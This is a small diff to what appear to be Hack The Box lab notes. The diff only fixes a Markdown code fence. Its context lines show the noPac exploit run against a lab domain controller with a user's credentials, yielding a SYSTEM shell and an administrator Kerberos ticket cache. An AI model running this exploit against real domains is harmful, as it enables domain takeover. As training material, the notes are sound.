@@ -3615,7 +3615,8 @@ mdmithu@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -d
 [*] Exploiting..
 [!] Launching semi-interactive shell - Careful what you execute
 C:\Windows\system32>
-``````
+```
+```
 mdmithu@htb[/htb]$ ls
 
 administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
